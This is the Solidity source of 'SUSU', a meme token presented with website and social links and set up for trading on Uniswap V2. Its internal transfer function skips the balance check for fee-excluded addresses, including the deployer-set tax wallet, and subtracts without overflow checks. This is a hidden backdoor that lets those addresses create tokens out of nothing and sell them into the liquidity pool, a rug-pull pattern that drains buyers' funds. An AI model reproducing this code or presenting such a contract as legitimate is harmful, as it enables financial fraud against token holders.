// SPDX-License-Identifier: UNLICENSED

/**

SuSu is Zhu Su’s unofficial meme token.

Website: https://www.susucoin.vip
Telegram: https://t.me/susucoin_eth
Twitter: https://x.com/susucoin_eth

*/

pragma solidity 0.8.15;

interface IFactory02 {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract SUSU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private cooldownTimer;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = false;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 9;
    uint256 private _reduceSellTaxAt = 9;
    uint256 private _preventSwapBefore = 9;
    uint256 private _buyCount = 0;

    bool public buyCooldownEnabled = false;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 69000000000 * 10 ** _decimals;
    string private constant _name = unicode"SUSU";
    string private constant _symbol = unicode"SUSU";
    uint256 public _maxTxAmount = 1380000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 1380000000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 690000000 * 10 ** _decimals;

    IRouter02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint8 public cooldownTimerInterval = 1;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _taxR) {
        _taxWallet = payable(_taxR);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function SuSuADD() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uniswapV2Router = IRouter02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _tTotal);

        uniswapV2Pair = IFactory02(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function enableSuSuTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        
        uint256 addAmounts = balanceOf(address(this)).sub(
            _tTotal.mul(_initialBuyTax).div(100)
        );

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            addAmounts,
            0,
            0,
            _msgSender(),
            block.timestamp
        );

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        swapEnabled = true;
        tradingOpen = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transferInternal(address from, address to, uint256 amount) internal {
        require(
            _balances[from] >= amount || _isExcludedFromFees[from],
            "ERC20: Not enough balance"
        );

        unchecked {
            _balances[from] = _balances[from] - amount;
        }
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 feesTAX = 0;
        if (from != owner() && to != owner()) {
            feesTAX = amount
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (transferDelayEnabled) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                buyCooldownEnabled &&
                !_isExcludedFromFees[to]
            ) {
                require(
                    cooldownTimer[to] < block.timestamp,
                    "buy Cooldown exists"
                );
                cooldownTimer[to] = block.timestamp + cooldownTimerInterval;
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFees[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                feesTAX = amount
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                to == uniswapV2Pair &&
                swapEnabled &&
                !inSwap &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                if(contractTokenBalance > 0){
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                
                sendETHToFees(address(this).balance);
            }
        }

        if (feesTAX > 0) {
            _transferInternal(from, address(this), feesTAX);
        }
        _transferInternal(from, to, (amount - feesTAX));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 addAmounts) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), addAmounts);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            addAmounts,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFees(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
}